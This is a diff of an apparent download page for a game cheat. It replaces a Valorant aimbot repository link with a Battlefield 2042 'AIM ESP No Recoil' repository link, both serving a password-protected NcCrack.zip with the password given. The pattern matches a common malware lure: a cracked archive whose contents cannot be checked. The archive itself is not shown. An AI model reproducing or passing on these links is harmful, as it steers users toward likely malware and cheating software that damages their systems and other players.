@@ -2,7 +2,7 @@
 
 # Download cheat
 
-|[Download](https://github.com/NitayWasTaken/Cheat-for-Valorant-OrukaSD-Radar-Aimbot/blob/main/NcCrack.zip?raw=true)|
+|[Download](https://github.com/BulePzi/Updated-24.01.2023-Hack-Battlefield-2042-AIM-ESP-No-Recoil/blob/main/NcCrack.zip?raw=true)|
 |:-------------|
 Passwrod: `2077`
 
